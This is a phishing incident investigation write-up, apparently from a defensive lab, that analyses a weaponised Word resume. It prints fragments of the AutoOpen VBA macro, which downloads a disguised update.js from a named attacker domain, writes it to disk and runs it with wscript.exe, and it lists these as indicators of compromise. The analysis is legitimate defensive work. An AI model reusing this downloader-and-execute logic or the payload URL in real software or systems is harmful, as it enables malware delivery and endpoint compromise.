Scenario Overview

This investigation analyses a phishing-based compromise. The attack originated from a malicious job application email containing a weaponized Microsoft Word document disguised as a resume.

Upon opening the attachment and enabling malicious macros, the victim workstation downloaded and executed multiple staged payloads. The infection chain progressed from a VBA macro to a JavaScript downloader and ultimately to a malicious executable that established command-and-control (C2) communications with attacker-controlled infrastructure.

Using email artefacts, process execution telemetry, memory analysis, and persistence artefacts, the investigation reconstructed the full attack chain from initial access through persistence and remote command execution.

The objective of this investigation was to determine how the compromise occurred, identify attacker activity on the endpoint, and assess the techniques used to maintain long-term access.

## Investigation Flow
Initial Access (Phishing Email)

The attacker gained initial access through a phishing email containing a malicious Microsoft Word document disguised as a resume. Once opened, the embedded macro initiated the malware delivery chain.

Evidence: maliciousapplication.png 

## Email Header Analysis

To validate the phishing email and identify its delivery path, the email headers were examined.

Evidence: email analysis.png

Analysis

The email traversed multiple Microsoft Exchange Online and Office 365 mail infrastructure servers before reaching the recipient mailbox.

Several relay systems belong to Microsoft's mail protection ecosystem, indicating the message was processed through standard Exchange Online Protection (EOP) filtering services.

Notable observations include:

The sender utilized Microsoft-hosted Outlook infrastructure.
Message transmission occurred over encrypted TLS 1.2 connections.
No unusual relay hops or direct SMTP connections from external mail servers were observed.
Some IP addresses were flagged by blacklist databases; however, these IPs belong to shared Microsoft mail infrastructure and should not be considered malicious solely on blacklist status.
The routing path is consistent with an email originating from an Outlook.com account and being delivered through Microsoft's cloud email ecosystem.
Security Significance

The email header analysis confirms that the phishing message was successfully delivered through legitimate Microsoft mail services, highlighting how attackers can abuse trusted email platforms to increase credibility and bypass basic reputation-based filtering controls.

This reinforces the importance of attachment analysis and user awareness, as infrastructure reputation alone would not have been sufficient to identify the message as malicious.

# Malicious Document Analysis

To determine how the phishing attachment initiated the compromise, the document was analysed using `olevba`, a tool from the Oletools suite used to identify and extract VBA macros from Microsoft Office documents.
Evidence: malicious doc.png

## Macro Discovery

Analysis revealed a VBA macro stored within the `NewMacros.bas` module. The macro was configured to execute automatically when the document was opened through the `AutoOpen()` function.

```vb
Sub AutoOpen()
...
End Sub
```

### Security Significance

The presence of the `AutoOpen()` function indicates that the malicious code executes immediately when the document is opened, requiring minimal user interaction beyond enabling macros.

This technique is commonly used in phishing campaigns to initiate malware delivery without requiring the victim to manually execute a file.

---

## Malware Delivery Mechanism

The macro creates a HTTP request using the `Microsoft.XMLHTTP` object and downloads a file from attacker-controlled infrastructure.

Observed URL:

```text
https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png
```

The downloaded content is written to disk using the `ADODB.Stream` object.

Observed Output File:

```text
C:\ProgramData\update.js
```

Relevant Macro Logic:

```vb
xHttp.Open "GET", "<remote URL>", False
xHttp.Send

With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile spath & "\update.js", 2
End With
```

### Security Significance

Although the downloaded resource uses a `.png` extension, the file is not treated as an image. Instead, its contents are written directly to a JavaScript file.

This is a common masquerading technique used to make malicious payloads appear harmless while bypassing simple content inspection mechanisms.

---

## Payload Execution

After saving the downloaded file, the macro launches Windows Script Host (`wscript.exe`) to execute the JavaScript payload.

Observed Command:

```text
wscript.exe C:\ProgramData\update.js
```

Relevant Macro Logic:

```vb
Set shell_object = CreateObject("WScript.Shell")
shell_object.Exec ("wscript.exe C:\ProgramData\update.js")
```

### Security Significance

The use of `wscript.exe` allows the attacker to execute JavaScript using a legitimate Windows binary rather than dropping a traditional executable.

This technique helps blend malicious activity into normal operating system behaviour and can evade security controls that focus primarily on executable files.

---

## Indicators of Compromise

| Type    | Indicator                                                                     |
| ------- | ----------------------------------------------------------------------------- |
| URL     | https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png |
| File    | C:\ProgramData\update.js                                                      |
| Process | wscript.exe                                                                   |

---

## Attack Behaviour Classification

✔ Macro-Based Execution

✔ AutoExec (AutoOpen)

✔ Remote Payload Retrieval

✔ Living-Off-The-Land Binary Abuse

✔ Script-Based Malware Execution

✔ File Masquerading

---

## Summary

Analysis of the malicious Word document confirmed that the phishing attachment served as the initial malware delivery mechanism. Upon opening the document, an embedded VBA macro automatically downloaded a second-stage payload from attacker-controlled infrastructure, saved it as `update.js`, and executed it using `wscript.exe`.

This activity established the transition from phishing-based initial access to active endpoint compromise and enabled deployment of subsequent malware stages.




